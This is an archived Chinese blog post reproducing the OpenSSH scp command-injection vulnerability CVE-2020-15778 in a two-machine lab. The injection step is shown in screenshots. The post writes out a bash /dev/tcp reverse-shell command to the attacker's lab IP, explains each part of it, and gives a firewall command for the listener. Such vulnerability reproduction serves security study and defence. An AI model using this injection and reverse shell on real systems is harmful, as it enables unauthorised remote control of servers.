# CVE-2020-15778 OpenSSH 命令注入漏洞复现 - canyezhizi - 博客园

> 原文：[`www.cnblogs.com/canyezhizi/p/13537495.html`](https://www.cnblogs.com/canyezhizi/p/13537495.html)

# 一、漏洞概要

OpenSSH 8.3p1 及之前版本中的 scp 允许在 scp.c 远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数 linux 系统受影响。

参考链接:[`github.com/cpandya2909/CVE-2020-15778`](https://github.com/cpandya2909/CVE-2020-15778)

# 二、环境部署

攻击机：Centos7.6 10.10.10.133

靶机：Centos7.6 10.10.10.134

# 三、漏洞复现

首先确认靶机 OpenSSH 版本是否在漏洞影响范围

![](img/601ee5c5a125de02bcf063403d35bf03.png)

## 1）正常远程拷贝

scp 是 linux 系统下基于 ssh 登陆进行安全的远程文件拷贝命令,命令格式：

```
scp local_file remote_username@remote_ip:remote_file 
```

攻击机在当前目录下创建一个拷贝用的测试文件 test.txt

![](img/eef5d5c4d1469660ce6bed7263046508.png)

远程拷贝文件

![](img/d26a6f141dd49f1e58f668f24488651d.png)

可以看到，在靶机上对比之前已经有拷贝过去的文件了

![](img/a17ad58c41018d3b52c76754fb94e724.png)

##  2）命令注入攻击

通过特殊符号 ` 进行远程命令注入攻击

![](img/350d07ac8aaafc9980f76c48437ae78a.png)

命令执行成功

 ![](img/3f1dc8a6cc2049834ea54e4f1b7ec358.png)

即可以在``内实现任意远程命令执行，甚至是从网上下载准备好的后门或者其他恶意程序

## 3）反弹 shell 利用

命令格式：

```
bash -i >&/dev/tcp/10.10.10.133/6666 0>&1

```

命令解析

| **命令** | **解释** |
| bash -i | 产生一个交互式 bash |
| >& /dev/tcp/ip/port | 建立 TCP 连接，并将标准输出和错误重定向到 TCP 连接 |
| 0>&1 | 从 TCP 连接获取输入 |

打开攻击机监听端口，如 6666

```
firewall-cmd --zone=public --add-port=6666/tcp --permanent
```

新开一个窗口开启监听

![](img/ae4b805a6dfd633d776c480944e175f0.png)

攻击机原窗口进行反弹 shell 命令注入攻击

![](img/56b298241694d9cb593c0b3db0d245da.png)

 执行成功，成功回显

![](img/9296d3898e089c6dfe51eb429d5f800b.png)

# 四、总结

此漏洞利用有一定的局限性，需要通过 SSH 身份认证。但是该漏洞影响范围非常广，且官方尚未发布安全更新补丁，请持续关注。